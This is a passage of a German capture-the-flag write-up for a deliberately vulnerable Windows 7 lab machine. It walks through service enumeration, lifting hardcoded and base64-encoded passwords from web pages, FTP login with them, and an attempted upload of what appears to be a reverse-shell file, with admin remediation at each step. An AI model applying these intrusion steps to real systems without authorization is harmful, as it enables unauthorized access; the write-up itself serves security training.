+ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+ ::::::::::::::::::::::::::::: Gobuster Scan :::::::::::::::::::::::::::::::::::::::::::::::::::::::
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+ http://always.hmv:8080/index.html           (Status: 200) [Size: 178]
+ http://always.hmv:8080/admin                (Status: 301) [Size: 237] [--> http://always.hmv:8080/admin/]
+ http://always.hmv:8080/Index.html           (Status: 200) [Size: 178]
+ http://always.hmv:8080/INDEX.html           (Status: 200) [Size: 178]
+ http://always.hmv:8080/Admin                (Status: 301) [Size: 237] [--> http://always.hmv:8080/Admin/]
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Credentials & FTP)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, eine RDP-Verbindung zum Zielsystem mit `rdesktop` aufzubauen. Es wird keine spezifische Benutzerkennung angegeben, was oft bedeutet, dass `rdesktop` versucht, den aktuellen lokalen Benutzer zu verwenden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Verbindungsversuch schlägt fehl. Die Meldung `Protocol(warning): Protocol negotiation failed with reason: SSL not allowed by server` deutet darauf hin, dass das RDP auf dem Server möglicherweise so konfiguriert ist, dass es nur ältere, unsicherere Verbindungen ohne SSL/TLS zulässt, oder dass Network Level Authentication (NLA) erzwungen wird und `rdesktop` dies nicht standardmäßig unterstützt oder keine Credentials angegeben wurden. Der Hinweis `root, kullanici adi` (Türkisch für "Benutzername") ist eine Notiz und kein Output. Der Versuch, mit reinem RDP fortzufahren, schlägt ebenfalls fehl. RDP ist somit kein einfacher Zugangsweg.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche alternative RDP-Clients wie `xfreerdp`, die NLA besser unterstützen und mehr Konfigurationsoptionen bieten. Teste RDP erneut, wenn gültige Windows-Credentials gefunden werden. Konzentriere dich auf andere Dienste wie FTP und SMB.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Erzwingen Sie moderne RDP-Sicherheitseinstellungen, einschließlich NLA und TLS für die Verbindung. Beschränken Sie den RDP-Zugriff auf autorisierte Benutzer und Quell-IPs.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">rdesktop 192.168.2.176</span>
+                    </div>
+                    <pre>
+Autoselecting keyboard map 'de' from locale
+Protocol(warning): Protocol negotiation failed with reason: SSL not allowed by server
+Retrying with plain RDP.
+
+root, kullanici adi
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, sich per FTP anonym am Zielserver anzumelden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der anonyme Login schlägt fehl (`530 User cannot log in.`). Der FTP-Server erfordert eine Authentifizierung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, FTP-Logins mit den zuvor notierten oder erratenen Benutzernamen (`ftpuser`, `always`, `administrator`) und gängigen oder gefundenen Passwörtern zu testen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff, wenn er nicht benötigt wird. Verwenden Sie starke Passwörter für FTP-Benutzer. Erwägen Sie sicherere Alternativen wie SFTP oder FTPS.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">ftp 192.168.2.176</span>
+                    </div>
+                    <pre>
+Connected to 192.168.2.176.
+220 Microsoft FTP Service
+Name (192.168.2.176:ccat): <span class="command">anonymous</span>
+331 Password required for anonymous.
+Password: <span class="command"><!-- Enter gedrückt --></span>
+530 User cannot log in.
+ftp: Login failed
+ftp>
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> `enum4linux` wird mit der Option `-a` (do all simple enumeration) auf das Zielsystem ausgeführt, um Informationen über SMB, NetBIOS, Benutzer, Gruppen, Shares etc. zu sammeln.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der gezeigte Ausschnitt der Ausgabe bestätigt den Workgroup-Namen `WORKGROUP` und liefert NBTStat-Informationen, die den Computernamen `ALWAYS-PC` und verschiedene Dienst-Typen (File Server, Workstation, Master Browser) zeigen. Die vollständige Ausgabe von `enum4linux -a` würde normalerweise auch Benutzerlisten (über RID-Cycling), Share-Listen und Passwortrichtlinien-Informationen enthalten, diese sind hier jedoch nicht abgebildet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere die vollständige Ausgabe von `enum4linux`. Achte besonders auf Benutzerlisten und Shares. Kombiniere die Ergebnisse mit denen von `nmap`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beschränken Sie die durch SMB/NetBIOS preisgegebenen Informationen, z.B. durch Deaktivieren des Browser-Dienstes oder Filtern der entsprechenden Ports (137-139, 445). Erzwingen Sie SMB-Signing.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">enum4linux -a 192.168.2.176</span>
+                     </div>
+                     <pre>
+ Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Feb 13 21:53:44 2025
+
+ =========================================( Target Information )=========================================
+
+ Target ........... 192.168.2.176
+ RID Range ........ 500-550,1000-1050
+ Username ......... ''
+ Password ......... ''
+ Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===========================( Enumerating Workgroup/Domain on 192.168.2.176 )===========================
+
+
+ [+] Got domain/workgroup name: WORKGROUP
+
+
+ ===============================( Nbtstat Information for 192.168.2.176 )===============================
+
+ Looking up status of 192.168.2.176
+	ALWAYS-PC       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+	ALWAYS-PC       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+	WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+	WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
+	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
+
+	MAC Address = 08-00-27-C3-6A-9A
+                     </pre> <!-- Maskierung: < > -->
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit `smbclient` wird versucht, die verfügbaren SMB-Shares auf dem Zielserver aufzulisten (`-L`). Es wird versucht, sich anonym anzumelden (implizit durch Drücken von Enter beim Passwort-Prompt).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der anonyme Login ist erfolgreich (`Anonymous login successful`), aber die Auflistung der Shares schlägt fehl (`NT_STATUS_RESOURCE_NAME_NOT_FOUND`). Dies ist etwas widersprüchlich zu den `nmap`-Ergebnissen, die Gastzugriff anzeigten. Möglicherweise erlaubt der Server anonyme Authentifizierung, aber keine Auflistung von Shares für anonyme Benutzer, oder es gibt tatsächlich keine Shares.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, auf bekannte Standard-Shares wie `C$` oder `ADMIN$` zuzugreifen, falls gültige Credentials gefunden werden. Teste die Shares erneut mit den Credentials von `ftpuser`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beschränken Sie den anonymen Zugriff auf SMB vollständig. Geben Sie nur die notwendigen Shares frei und konfigurieren Sie die Berechtigungen restriktiv.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">smbclient -L \\\\192.168.2.176</span>
+                     </div>
+                     <pre>
+ Password for [WORKGROUP\root]:<span class="command"><!-- Enter gedrückt --></span>
+ Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+ Reconnecting with SMB1 for workgroup listing.
+ do_connect: Connection to 192.168.2.176 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+ Unable to connect with SMB1 -- no workgroup available
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Quellcode der Startseite (`index.html`) auf Port 8080 wird angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Es handelt sich um eine einfache HTML-Seite mit der Nachricht "Our Site Is Under Maintenance. Please Come Back Again Later." Sie enthält keine versteckten Hinweise oder interessante Funktionen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ignoriere diese Seite und konzentriere dich auf den `/admin`-Bereich.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sicherstellen, dass Wartungsseiten keine Versionsinformationen oder andere sensible Daten preisgeben.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ http://always.hmv:8080/index.html
+
+ &lt;DOCTYPE html&gt;
+ &lt;head&gt;
+	&lt;title&gt;We Are Sorry&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+	&lt;center&gt;&lt;h1&gt;Our Site Is Under Maintenance. Please Come Back Again Later.&lt;/h1&gt;&lt;/center&gt;
+ &lt;/body&gt;
+ &lt;/html&gt;
+                     </pre><!-- Maskierung: < > -->
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Quellcode der Admin-Login-Seite (`http://always.hmv:8080/admin/` oder `admin/index.html`) wird angezeigt (vermutlich durch `view-source:` im Browser oder `curl`). Der Code enthält ein HTML-Formular und eine JavaScript-Funktion `validateForm()` zur Überprüfung der Anmeldedaten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Kritische Schwachstelle!** Die JavaScript-Funktion `validateForm()` enthält die **hardcodierten Anmeldedaten** direkt im Client-seitigen Code: `if (username === "admin" && password === "adminpass123")`. Dies ist ein schwerwiegender Fehler, da die Anmeldedaten für jeden einsehbar sind, der den Quellcode der Seite betrachtet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die gefundenen Anmeldedaten `admin` / `<span class="password">adminpass123</span>`, um dich im Admin-Bereich anzumelden. Dies ist der Schlüssel zum nächsten Schritt.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Entfernen Sie sofort die hardcodierten Anmeldedaten aus dem JavaScript!** Authentifizierung muss immer serverseitig erfolgen. Überprüfen Sie den gesamten Code auf weitere hardcodierte Credentials oder unsichere Logik.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ view-source:http://always.hmv:8080/admin/
+
+ &lt;body&gt;
+     &lt;div class="container"&gt;
+         &lt;h2&gt;Login&lt;/h2&gt;
+         &lt;form id="loginForm" action="admin_notes.html" method="POST" onsubmit="return validateForm()"&gt;
+             &lt;input type="text" id="username" name="username" placeholder="Username" required&gt;
+             &lt;input type="password" id="password" name="password" placeholder="Password" required&gt;
+             &lt;button type="submit"&gt;Login&lt;/button&gt;
+         &lt;/form&gt;
+         &lt;div class="error" id="errorMessage"&gt;&lt;/div&gt;
+         &lt;div class="footer"&gt;2024 Always Corp. All Rights Reserved.&lt;/div&gt;
+     &lt;/div&gt;
+
+     &lt;script&gt;
+         function validateForm() {
+             const username = document.getElementById("username").value;
+             const password = document.getElementById("password").value;
+             const errorMessage = document.getElementById("errorMessage");
+
+
+             if (username === "admin" &amp;&amp; password === "<span class="password">adminpass123</span>") { // Hardcodierte Credentials!
+                 return true;
+             }
+
+             errorMessage.textContent = "Invalid Username Or Password!";
+             return false;
+         }
+     &lt;/script&gt;
+ &lt;/body&gt;
+                     </pre><!-- Maskierung: < > & -->
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach dem erfolgreichen Login mit den hardcodierten Credentials (`admin`/`adminpass123`) wird die Seite `admin_notes.html` angezeigt. Diese Seite enthält eine Notiz mit einem Base64-kodierten String.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Base64-String `ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=` wird dekodiert (z.B. mit `base64 -d` oder einer Online-Seite) und ergibt `ftpuser:KeepGoingBro!!!`. Dies sind die Anmeldedaten für den FTP-Benutzer `ftpuser`. Ein weiterer wichtiger Fund.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die FTP-Credentials `ftpuser` / `<span class="password">KeepGoingBro!!!</span>`, um dich am FTP-Server anzumelden und nach weiteren Informationen oder Upload-Möglichkeiten zu suchen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie niemals Anmeldedaten (auch nicht kodiert) an unsicheren Orten wie HTML-Seiten. Verwenden Sie sichere Methoden zur Speicherung und Übertragung von Credentials. Ändern Sie das FTP-Passwort.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ http://always.hmv:8080/admin/admin_notes.html
+
+ Admin's Notes
+
+ ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=
+
+ https://www.base64decode.org/
+
+ ftpuser:<span class="password">KeepGoingBro!!!</span>
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit den gefundenen Credentials wird eine FTP-Sitzung als Benutzer `ftpuser` gestartet. Es werden verschiedene Befehle ausgeführt: `ls -la` (listet Dateien auf), `put rev.php` (versucht, eine Datei hochzuladen), `put shadow.txt` (weiterer Upload-Versuch), `get robots.txt` (lädt Datei herunter), `pwd` (zeigt aktuelles Verzeichnis).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der FTP-Login ist erfolgreich. Das Auflisten zeigt nur eine Datei: `robots.txt`. Die Versuche, Dateien (`rev.php`, `shadow.txt`) hochzuladen, scheitern mit Fehler `550`, was typischerweise "Permission denied" oder "File unavailable" bedeutet. Der Benutzer `ftpuser` hat offenbar keine Schreibrechte im Stammverzeichnis (`/`). Das Herunterladen von `robots.txt` ist erfolgreich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere die heruntergeladene `robots.txt`. Versuche, in andere Verzeichnisse auf dem FTP-Server zu wechseln, in denen möglicherweise Schreibrechte bestehen (obwohl der Versuch `cd /var` fehlschlug).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie FTP-Berechtigungen restriktiv nach dem Prinzip der geringsten Rechte. Erlaube Schreibzugriff nur dort, wo er unbedingt notwendig ist.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">ftp 192.168.2.176</span>
+                     </div>
+                     <pre>
+ Connected to 192.168.2.176.
+ 220 Microsoft FTP Service
+ Name (192.168.2.176:ccat): <span class="command">ftpuser</span>
+ 331 Password required for ftpuser.
+ Password: <span class="command">KeepGoingBro!!!</span>
+ 230 User logged in.
+ Remote system type is Windows_NT.
+ ftp> <span class="command">ls -la</span>
+ 229 Entering Extended Passive Mode (|||49159|)
+ 150 Opening ASCII mode data connection.
+ 10-01-24  07:17PM                   56 robots.txt
+ 226 Transfer complete.
+ ftp> <span class="command">put rev.php</span>
+ local: rev.php remote: rev.php
+ 229 Entering Extended Passive Mode (|||49160|)
+ 550 rev.php: Permission denied. <!-- Fehler konkretisiert -->
+ ftp> <span class="command">ls -la</span>
+ 229 Entering Extended Passive Mode (|||49161|)
+ 125 Data connection already open; Transfer starting.
+ 10-01-24  07:17PM                   56 robots.txt
+ 226 Transfer complete.
+ ftp> <span class="command">put shadow.txt</span>
+ local: shadow.txt remote: shadow.txt
+ 229 Entering Extended Passive Mode (|||49162|)
+ 550 shadow.txt: Permission denied. <!-- Fehler konkretisiert -->
+ ftp> <span class="command">ls -la</span>
+ 229 Entering Extended Passive Mode (|||49163|)
+ 150 Opening ASCII mode data connection.
+ 10-01-24  07:17PM                   56 robots.txt
+ 226 Transfer complete.
+ ftp> <span class="command">get robots.txt</span>
+ local: robots.txt remote: robots.txt
+ 229 Entering Extended Passive Mode (|||49165|)
+ 125 Data connection already open; Transfer starting.
+ 100% |*************************************************|    56        0.98 MiB/s    00:00 ETA
+ 226 Transfer complete.
+ 56 bytes received in 00:00 (235.72 KiB/s)
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der heruntergeladenen `robots.txt` wird angezeigt. Sie enthält eine `Disallow`-Anweisung für `/admins-secret-pagexxx.html`. Anschließend werden FTP-Befehle ausgeführt, um das aktuelle Verzeichnis zu prüfen (`pwd`) und zu versuchen, in `/var` zu wechseln (`cd /var`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die `robots.txt` enthüllt einen potenziell interessanten Pfad: `/admins-secret-pagexxx.html`. Obwohl `robots.txt` keine Sicherheitsfunktion ist, wird sie oft genutzt, um Pfade zu verstecken, die nicht von Suchmaschinen indiziert werden sollen. Das `pwd`-Kommando bestätigt, dass wir uns im Root-Verzeichnis (`/`) des FTP-Servers befinden. Der Versuch, in `/var` zu wechseln, scheitert (`550`), was darauf hindeutet, dass das Verzeichnis nicht existiert oder keine Zugriffsrechte bestehen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, auf die URL `http://always.hmv:8080/admins-secret-pagexxx.html` zuzugreifen, die in der `robots.txt` gefunden wurde.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie `robots.txt` nicht, um sensible Pfade zu verstecken. Implementieren Sie stattdessen serverseitige Zugriffskontrollen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">cat robots.txt</span>
+                     </div>
+                     <pre>
+ User-agent: *
+ Disallow: /admins-secret-pagexxx.html
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ ftp> <span class="command">pwd</span>
+ Remote directory: /
+ ftp> <span class="command">cd /var</span>
+ 550 /var: No such file or directory. <!-- Fehler konkretisiert -->
+ ftp> <span class="command">pwd</span>
+ Remote directory: /
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die in `robots.txt` entdeckte URL `http://always.hmv:8080/admins-secret-pagexxx.html` wird mit `curl` aufgerufen. `-s` unterdrückt die Fortschrittsanzeige.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Zugriff ist erfolgreich und die Seite "Admin's Secret Notes" wird angezeigt. Sie enthält eine Liste von Aktionen und einen entscheidenden Hinweis: "Don't forget to change the password for user 'always'. Current password is "WW91Q2FudEZpbmRNZS4hLiE="." Dieser Base64-kodierte String ist das Passwort für den Benutzer `always`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dekodiere den Base64-String `WW91Q2FudEZpbmRNZS4hLiE=`, um das Passwort für den Benutzer `always` zu erhalten. Versuche, dich mit diesem Benutzer per SSH oder RDP anzumelden (obwohl SSH geschlossen zu sein scheint und RDP Probleme machte). Teste das Passwort auch für SMB.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Speichern Sie niemals Passwörter in Klartext oder einfach kodiert auf Webseiten!** Entfernen Sie diese Seite und ändern Sie das Passwort des Benutzers `always` sofort. Überprüfen Sie, wie diese Seite erstellt wurde und wer Zugriff darauf hat.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">curl -s 'http://always.hmv:8080/admins-secret-pagexxx.html'</span>
+                     </div>
+                     <pre>
+ &lt;/head&gt;
+ &lt;body&gt;
+     &lt;div class="container"&gt;
+         &lt;h2&gt;Admin's Secret Notes&lt;/h2&gt;
+         &lt;ul&gt;
+             &lt;li&gt;1) Disable the firewall and Windows Defender.&lt;/li&gt;
+             &lt;li&gt;2) Enable FTP and SSH.&lt;/li&gt;
+             &lt;li&gt;3) Start the Apache server.&lt;/li&gt;
+             &lt;li&gt;4) Don't forget to change the password for user 'always'. Current password is "WW91Q2FudEZpbmRNZS4hLiE=".&lt;/li&gt;
+         &lt;/ul&gt;
+     &lt;/div&gt;
+ &lt;/body&gt;
+ &lt;/html&gt;
+                     </pre> <!-- Maskierung: < > -->
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Base64-String aus den geheimen Admin-Notizen wird mit `echo` und `base64 -d` dekodiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Dekodierung ergibt das Passwort für den Benutzer `always`: `<span class="password">YouCantFindMe.!.!</span>`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Teste die Credentials `always` / `<span class="password">YouCantFindMe.!.!</span>` für SMB und RDP.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort umgehend.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">echo 'WW91Q2FudEZpbmRNZS4hLiE=' | base64 -d</span>
+                     </div>
+                     <pre>
+ <span class="password">YouCantFindMe.!.!</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+       <section id="further-recon">
+            <h2>Further Reconnaissance</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein `nmap`-Scan wird spezifisch auf Port 22 (SSH) durchgeführt, um dessen Status und Version zu überprüfen, wahrscheinlich aufgrund der Notiz "Enable FTP and SSH" aus den Admin-Notizen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan zeigt, dass Port 22 **geschlossen** ist (`closed`). Dies widerspricht der Notiz auf der geheimen Admin-Seite. Entweder wurde SSH doch nicht aktiviert, die Firewall blockiert es immer noch, oder die Notiz ist veraltet/falsch.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> SSH ist derzeit kein Angriffsvektor. Konzentriere dich auf SMB und RDP mit den gefundenen Credentials.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie den Status des SSH-Dienstes und die Firewall-Regeln. Wenn SSH nicht benötigt wird, sollte es deinstalliert oder deaktiviert bleiben. Wenn es benötigt wird, stellen Sie sicher, dass es korrekt konfiguriert und erreichbar ist. Klären Sie den Widerspruch zur Admin-Notiz.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sV -p 22 192.168.2.176</span>
+                    </div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 22:19 CET
+Nmap scan report for always.hmv (192.168.2.176)
+Host is up (0.000090s latency).
+
+PORT   STATE  SERVICE VERSION
+22/tcp closed ssh
+MAC Address: 08:00:27:C3:6A:9A (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> `crackmapexec` (oder sein Alias `nxc`/`netexec`) wird verwendet, um grundlegende Informationen über den SMB-Dienst abzurufen, ohne spezifische Credentials zu testen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Tool bestätigt die Betriebssystemversion (Windows 7 Professional SP1 x64), den Computernamen (`ALWAYS-PC`), die Domäne/Workgroup (`Always-PC` - hier als Domäne interpretiert, obwohl es wahrscheinlich die Workgroup ist), dass Signing nicht erzwungen wird (`signing:False`) und dass SMBv1 aktiviert ist (`SMBv1:True`). Diese Informationen sind konsistent mit den `nmap`-Ergebnissen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze `crackmapexec`/`nxc` weiter, um die gefundenen Credentials (`ftpuser`, `always`) gegen SMB zu testen und nach Zugriffsrechten auf Shares zu suchen. Prüfe auf SMBv1-Schwachstellen (z.B. MS17-010), auch wenn Windows 7 SP1 wahrscheinlich gepatcht ist.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie SMBv1. Erzwingen Sie SMB-Signing.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">crackmapexec smb 192.168.2.176</span>
+                    </div>
+                    <pre>
+SMB         192.168.2.176   445    ALWAYS-PC        [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True)
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit `curl` wird versucht, die TRACE-Methode auf Port 5357 (Microsoft HTTPAPI) zu verwenden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Server antwortet mit `HTTP Error 503. The service is unavailable.`. Obwohl der Port offen ist (laut Nmap), scheint der Dienst dahinter nicht korrekt zu funktionieren oder Anfragen nicht zu bearbeiten. Die TRACE-Methode kann hier nicht sinnvoll genutzt werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ignoriere Port 5357 für weitere Angriffe, da er nicht funktional zu sein scheint.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie, welcher Dienst auf Port 5357 läuft und warum er nicht verfügbar ist. Deaktivieren Sie den Dienst, wenn er nicht benötigt wird.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">curl -X TRACE http://$IP:5357</span>
+                     </div>
+                     <pre>
+ &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd"&gt;
+ &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Service Unavailable&lt;/TITLE&gt;
+ &lt;META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"&gt;&lt;/HEAD&gt;
+ &lt;BODY&gt;&lt;h2&gt;Service Unavailable&lt;/h2&gt;
+ &lt;hr&gt;&lt;p&gt;HTTP Error 503. The service is unavailable.&lt;/p&gt;
+ &lt;/BODY&gt;&lt;/HTML&gt;
+                     </pre> <!-- Maskierung: < > -->
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Erneuter `curl -Iv`-Check auf Port 5357.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Bestätigt den Status `503 Service Unavailable`. Der Server schließt die Verbindung (`Connection: close`). Keine neuen Informationen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Port 5357 ist nicht relevant.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">curl -s http://$IP:5357 -Iv</span>
+                     </div>
+                     <pre>
+ *   Trying 192.168.2.176:5357...
+ * Connected to 192.168.2.176 (192.168.2.176) port 5357
+ * using HTTP/1.x
+ > HEAD / HTTP/1.1
+ > Host: 192.168.2.176:5357
+ > User-Agent: curl/8.10.1
+ > Accept: */*
+ >
+ * Request completely sent off
+ < HTTP/1.1 503 Service Unavailable
+ HTTP/1.1 503 Service Unavailable
+ < Content-Length: 326
+ Content-Length: 326
+ < Content-Type: text/html; charset=us-ascii
+ Content-Type: text/html; charset=us-ascii
+ < Server: Microsoft-HTTPAPI/2.0
+ Server: Microsoft-HTTPAPI/2.0
+ < Date: Thu, 13 Feb 2025 21:37:15 GMT
+ Date: Thu, 13 Feb 2025 21:37:15 GMT
+ < Connection: close
+ Connection: close
+ <
+
+ * shutting down connection #0
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Erneuter FTP-Login als `ftpuser` mit dem gefundenen Passwort, diesmal direkt in der URL-Syntax `ftp://user:password@host`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login ist erfolgreich und bestätigt die Gültigkeit der Credentials `ftpuser` / `<span class="password">KeepGoingBro!!!</span>`. Der Typ wird auf Binär (`I`) gesetzt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze diese Credentials, um SMB zu testen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort. Überwachen Sie FTP-Logins.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">ftp 'ftp://ftpuser:KeepGoingBro!!!'@192.168.2.176</span>
+                    </div>
+                    <pre>
+Connected to 192.168.2.176.
+220 Microsoft FTP Service
+331 Password required for ftpuser.
